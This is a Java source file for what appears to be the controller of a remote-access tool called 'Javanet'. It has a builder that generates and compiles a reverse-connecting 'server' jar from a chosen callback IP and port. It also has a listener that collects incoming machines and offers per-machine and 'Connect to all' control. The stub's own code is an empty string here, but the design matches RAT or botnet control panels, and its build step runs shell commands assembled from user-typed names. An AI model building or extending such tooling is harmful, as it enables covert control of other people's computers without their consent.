package javanet.client;

import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.GridLayout;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.UnknownHostException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JTextField;

/**
 *
 * @author Jackson McClintock
 */
public class Client {
    
    String serverCode = "";
    int screenx = Toolkit.getDefaultToolkit().getScreenSize().width;
    int screeny = Toolkit.getDefaultToolkit().getScreenSize().height;
    JFrame frame = null;
    IdComponent[] comps = new IdComponent[10000];
    GridBagConstraints gc = new GridBagConstraints();
    final int SLEEP_INTERVAL = 10;
    Client client = this;
    
    public Client(){
        frame = new JFrame("Javanet v1.0.1");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setLayout(new GridBagLayout());
        JButton create = new JButton("Create Server");
        JButton listen = new JButton("Listen");
        JButton connectAll = new JButton("Connect to all");
        gc.fill = GridBagConstraints.HORIZONTAL;
        gc.gridx = 0;
        gc.gridy = 0;
        gc.ipadx = 100;
        gc.ipady = 10;
        gc.anchor = GridBagConstraints.NORTH;
        frame.add(create, gc);
        create.addActionListener((ActionEvent ae) -> {
            new Thread(){
                @Override
                public void run(){
                    createServerFrame();
                }
            }.start();
        });
        gc.gridx = 1;
        frame.add(listen, gc);
        gc.gridx = 0;
        listen.addActionListener((ActionEvent ae) -> {
            new Thread(){
                @Override
                public void run(){
                    listenFrame();
                }
            }.start();
        });
        gc.gridx=1;
        gc.gridy=1;
        frame.add(connectAll, gc);
        gc.gridx=0;
        connectAll.addActionListener((ActionEvent ae) -> {
            Socket[] sockets = new Socket[10000];
            for (int i = 0; i < comps.length; i++){
                if(comps[i] == null){
                    break;
                }
                sockets[i] = comps[i].getSocket();
            }
            new Thread(){
                @Override
                public void run(){
                    ControlAll controlAll = new ControlAll(sockets);
                }
            }.start();
        });
        frame.pack();
        frame.setLocation(screenx / 3, screeny / 3);
        frame.setVisible(true);
    }
    
    public void listen(int port){
        ServerSocket servSocket = null;
        InetSocketAddress inetbind;
        SocketAddress bind;
        InetAddress localIp = null;
        Socket socket = null;
        try {
            localIp = InetAddress.getLocalHost();
        } catch (UnknownHostException ex) {
            Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
        }
        inetbind = new InetSocketAddress(localIp, port);
        System.out.println(localIp.getHostAddress());
        bind = (SocketAddress) inetbind;
        try {
            servSocket = new ServerSocket();
        } catch (IOException ex) {
            Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
        }
        try {
            servSocket.bind(bind);
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(null, "Already listening on port", "Listen Error", JOptionPane.ERROR_MESSAGE);
            return;
        }
        try {
            socket = servSocket.accept();
        } catch (IOException ex) {
            Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
        }
        for(;;){
            if(check(socket.getInetAddress()) == 0){
                JButton connect_button = new JButton("Connect");
                Socket temp_socket = socket;
                connect_button.addActionListener((ActionEvent ae) -> {
                    new Thread(){
                        @Override
                        public void run(){
                            Control control = new Control(client, connect_button, temp_socket);
                        }
                    }.start();
                });
                add(socket.getInetAddress(), socket, connect_button);
            }
            try {
                Thread.sleep(SLEEP_INTERVAL);
            } catch (InterruptedException ex) {
                Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
            }
            try {
                socket = servSocket.accept();
            } catch (IOException ex) {
                Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
    
    public void add(InetAddress ip, Socket socket, JButton connectButton){
        for(int i = 0; i < comps.length; i++){
            if(comps[i] == null){
                comps[i] = new IdComponent(new JLabel("IP: " + ip.getHostAddress(), JLabel.CENTER));
                comps[i].setIp(ip);
                comps[i].setSocket(socket);
                gc.gridy += 1;
                frame.add(comps[i].getComponent(), gc);
                gc.gridx = 1;
                frame.add(connectButton, gc);
                gc.gridx = 0;
                frame.pack();
                frame.revalidate();
                frame.repaint();
                break;
            }
        }
    }
    
    public void remove(InetAddress ip, JButton connectButton){
        for(int i = 0; i < comps.length; i++){
            if(comps[i] == null){
                break;
            }
            if(comps[i].getIp().equals(ip)){
                frame.remove(comps[i].getComponent());
                frame.remove(connectButton);
                gc.gridy -= 1;
                comps[i] = null;
                frame.pack();
                frame.revalidate();
                frame.repaint();
            }
        }
    }
    
    public int check(InetAddress ip){
        for(IdComponent comp : comps) {
            if (comp == null) {
                return 0;
            }
            if (comp.getIp().equals(ip)) {
                return 1;
            }
        }
        return 0;
    }
    
    public void createServerFrame(){
        JFrame servFrame = new JFrame("Create Server");
        JLabel name_label = new JLabel("Name: ");
        JTextField name_field = new JTextField();
        JLabel ip_label = new JLabel("Reverse ip:");
        JLabel port_label = new JLabel("Port:");
        JTextField ip_field = new JTextField();
        JTextField port_field = new JTextField();
        JButton create_button = new JButton("Create");
        servFrame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        servFrame.setLayout(new GridLayout(5,2));
        servFrame.add(name_label);
        servFrame.add(name_field);
        servFrame.add(ip_label);
        servFrame.add(ip_field);
        servFrame.add(port_label);
        servFrame.add(port_field);
        servFrame.add(new JLabel("Connection Retry Timeout:"));
        servFrame.add(new JLabel("5 seconds"));
        servFrame.add(new JLabel(""));
        servFrame.add(create_button);
        create_button.addActionListener((ActionEvent ae) -> {
            createServer(ip_field.getText(), Integer.valueOf(port_field.getText()), name_field.getText());
            servFrame.dispose();
        });
        servFrame.setBounds(screenx / 3, screeny / 3, 400, 200);
        servFrame.setVisible(true);
    }
    
    public void createServer(String ip, int port, String name){
        FileOutputStream fos = null;
        File serverFile;
        serverCode = "";
        File locationFile = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getFile());
        String location = locationFile.getAbsolutePath() + File.separator;
        try {
            serverFile = new File(location + name + ".java");
            fos = new FileOutputStream(serverFile);
            try {
                fos.write(serverCode.getBytes());
            } catch (IOException ex) {
                Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
            }
        } catch (FileNotFoundException ex) {
            Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
        } finally {
            try {
                fos.close();
            } catch (IOException ex) {
                Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        if(System.getProperty("os.name").length() >= 7 && System.getProperty("os.name").substring(0, 7).equals("Windows")){
            fos = null;
            File compileFile;
            String compileCode = "cd " + location + "\r\njavac " + name + ".java\r\njar cfe " + name + ".jar " + name + " " + name + ".class\r\ndel " + name + ".java\r\ndel " + name + ".class";
            try {
                compileFile = new File(location + "compile.bat");
                fos = new FileOutputStream(compileFile);
                try {
                    fos.write(compileCode.getBytes());
                } catch (IOException ex) {
                    Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
                }
            } catch (FileNotFoundException ex) {
                Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
            } finally {
                try {
                    fos.close();
                } catch (IOException ex) {
                    Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
            try {
                Process comp = Runtime.getRuntime().exec("cmd /c " + location + "compile.bat");
                for(;;){
                    if(!comp.isAlive()){
                        break;
                    }
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException ex) {
                        Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
                Runtime.getRuntime().exec("cmd /c del " + location + "compile.bat");
            } catch (IOException ex) {
                Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
            }
            JOptionPane.showMessageDialog(null, "Located in " + location, "Build Successful", JOptionPane.INFORMATION_MESSAGE);
        }else{
            fos = null;
            File compileFile;
            String compileCode = "cd " + location + "; javac " + name + ".java; jar cfe " + name + ".jar " + name + " " + name + ".class; rm Server.java; rm Server.class;";
            try {
                compileFile = new File(location + "compile.sh");
                fos = new FileOutputStream(compileFile);
                try {
                    fos.write(compileCode.getBytes());
                } catch (IOException ex) {
                    Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
                }
            } catch (FileNotFoundException ex) {
                Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
            } finally {
                try {
                    fos.close();
                } catch (IOException ex) {
                    Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
            try {
                Runtime.getRuntime().exec("sh " + location + "compile.sh");
                Runtime.getRuntime().exec("rm " + location + "compile.sh");
            } catch (IOException ex) {
                Logger.getLogger(Client.class.getName()).log(Level.SEVERE, null, ex);
            }
            JOptionPane.showMessageDialog(null, "Located in " + location, "Build Successful", JOptionPane.INFORMATION_MESSAGE);
        }
    }
    
    public void listenFrame(){
        JFrame listenFrame = new JFrame("Listen");
        listenFrame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        listenFrame.setLayout(new GridLayout(2,2));
        listenFrame.add(new JLabel("Port: "));
        JTextField portField = new JTextField();
        JButton listenButton = new JButton("Listen");
        listenFrame.add(portField);
        listenFrame.add(listenButton);
        listenButton.addActionListener((ActionEvent ae) -> {
            new Thread(){
                @Override
                public void run(){
                    listen(Integer.valueOf(portField.getText()));
                }
            }.start();
            listenFrame.dispose();
        });
        listenFrame.setBounds(screenx / 3, screeny / 3, 300, 100);
        listenFrame.setVisible(true);
    }
    
    public static void main(String[] args) {
        Client client = new Client();
    }
}
